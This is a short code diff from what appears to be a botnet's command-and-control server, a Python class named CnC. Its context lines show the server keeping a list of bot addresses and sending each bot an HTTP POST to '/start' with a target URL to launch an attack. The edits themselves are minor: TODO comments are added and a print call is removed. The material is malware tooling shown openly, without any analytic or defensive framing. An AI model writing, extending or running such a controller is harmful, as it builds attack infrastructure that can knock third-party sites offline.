@@ -12,7 +12,7 @@ class CnC:
 
     def __init__(self, host: str, port: int):
         self.__address = (host, port)
-        self.__bots = {}
+        self.__bots = {}  # TODO refactor to list of bots
         self.__load_bots()
 
         self.__cmds = {
@@ -68,7 +68,7 @@ class CnC:
                     self.__bots.pop(addr)
         return responses
 
-    def __bot_connection(self, stop: threading.Event):
+    def __bot_connection(self, stop: threading.Event):  # TODO make it a web server
 
         while not stop.is_set():
             try:
@@ -151,7 +151,6 @@ class CnC:
                     requests.post(f"http://{address}:{port}/start", json={'url': url}).status_code
                     for address, port in self.__bots.items()
                 })
-            print(responses)
         if len(responses) == 1 and responses.pop() != 200:
             return "Attack did not start..."
         return "Attack started successfully!"
